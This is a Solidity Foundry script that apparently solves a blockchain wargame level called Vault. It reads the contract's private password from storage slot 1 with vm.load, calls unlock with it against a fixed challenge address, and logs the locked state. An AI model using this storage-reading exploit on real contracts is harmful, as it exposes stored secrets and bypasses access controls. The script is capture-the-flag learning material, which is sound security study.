// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { Vault } from "../src/08_Vault.sol";

contract VaultAttacker is Script {

  address challengeInstanceAddress = 0x67f1b172b26c38Ee6684E18b1b81Ce45e317A120;
  Vault challenge = Vault(challengeInstanceAddress);
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {
    vm.startBroadcast(deployerPrivateKey);
    bytes32 slotData = vm.load(challengeInstanceAddress, bytes32(uint256(1)));
    challenge.unlock(slotData);
    console.log("Locked: %s", challenge.locked());

    vm.stopBroadcast();
  }

}